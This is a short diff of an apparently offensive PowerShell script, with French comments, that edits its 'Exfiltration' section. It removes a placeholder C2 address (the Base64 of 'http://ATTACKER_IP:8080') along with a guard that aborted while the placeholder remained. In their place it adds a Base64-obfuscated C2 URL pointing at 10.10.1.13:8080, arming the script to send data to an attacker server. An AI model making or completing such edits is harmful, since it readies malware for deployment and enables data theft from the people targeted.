@@ -137,13 +137,8 @@ $_d = @{
 
 # ── Exfiltration ──────────────────────────────────────────────
 
-# Remplacer ATTACKER_IP par l'adresse IP réelle du serveur C2
-# La valeur ci-dessous est le Base64 de "http://ATTACKER_IP:8080"
-# Pour déployer : encoder la vraie URL en Base64 et remplacer la valeur
-$_c2 = (g0 "aHR0cDovL0FUVEFDS0VSX0lQOjgwODA=")  # http://ATTACKER_IP:8080
-
-# Vérification que le placeholder a bien été remplacé avant déploiement
-if ($_c2 -match "ATTACKER_IP") { exit }
+# Serveur C2 : http://10.10.1.13:8080
+$_c2 = (g0 "aHR0cDovLzEwLjEwLjEuMTM6ODA4MA==")
 
 $_ok = $false
 try {
